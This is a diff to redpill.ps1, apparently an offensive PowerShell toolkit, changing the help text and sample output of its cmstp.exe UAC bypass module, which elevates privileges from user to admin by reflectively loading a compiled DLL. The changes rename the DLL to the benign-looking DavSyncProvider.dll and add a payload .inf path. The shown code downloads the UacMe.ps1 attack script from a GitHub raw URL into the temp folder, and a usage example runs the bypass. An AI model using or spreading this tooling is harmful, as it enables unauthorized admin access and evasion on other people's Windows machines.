@@ -2548,19 +2548,15 @@ If($UacMe -ne "false"){
       UAC bypass|EOP by dll reflection! (cmstp.exe)
 
    .DESCRIPTION
-      User Account Control, commonly abbreviated UAC, is a Windows security component introduced
-      in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
-      resources and operations as much as possible, unless they are explicitly granted by the user.
-   
-   .NOTES   
-      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
-      PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)
+      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
+      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
+      and elevate privileges { user -> admin } or to exec one command with admin privs!
 
    .Parameter UacMe
       Accepts arguments: Bypass OR Clean
 
    .Parameter Execute
-      Accepts the command to be executed! (cmd|powershell)
+      Accepts the command\appl to be executed! (cmd|powershell)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
@@ -2584,6 +2580,8 @@ If($UacMe -ne "false"){
       Remark: Admin privileges are required to delete PS logfiles.
 
    .OUTPUTS
+      Payload file written to C:\Windows\Temp\455pj4k3.inf
+
       Privilege Name                Description                                   State
       ============================= ============================================= ========
       SeShutdownPrivilege           Encerrar o sistema                            Disabled
@@ -2594,7 +2592,7 @@ If($UacMe -ne "false"){
 
       UAC State     : Enabled
       UAC Settings  : Notify Me
-      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
+      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
       Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
    #>
 
@@ -2603,7 +2601,7 @@ If($UacMe -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,0703125/KB
+      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,78515625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -4179,14 +4177,10 @@ $HelpParameters = @"
    .SYNOPSIS
       UAC bypass|EOP by dll reflection! (cmstp.exe)
 
-   .DESCRIPTION
-      User Account Control, commonly abbreviated UAC, is a Windows security component introduced
-      in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
-      resources and operations as much as possible, unless they are explicitly granted by the user.
-   
-   .NOTES   
-      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
-      PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)
+   .DESCRIPTION 
+      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
+      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
+      and elevate privileges { user -> admin } or to exec one command with admin privs!
 
    .Parameter UacMe
       Accepts arguments: Bypass OR Clean
@@ -4216,6 +4210,8 @@ $HelpParameters = @"
       Remark: Admin privileges are required to delete PS logfiles.
 
    .OUTPUTS
+      Payload file written to C:\Windows\Temp\455pj4k3.inf
+
       Privilege Name                Description                                   State
       ============================= ============================================= ========
       SeShutdownPrivilege           Encerrar o sistema                            Disabled
@@ -4226,7 +4222,7 @@ $HelpParameters = @"
 
       UAC State     : Enabled
       UAC Settings  : Notify Me
-      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
+      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
       Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
    #>!bye..
 
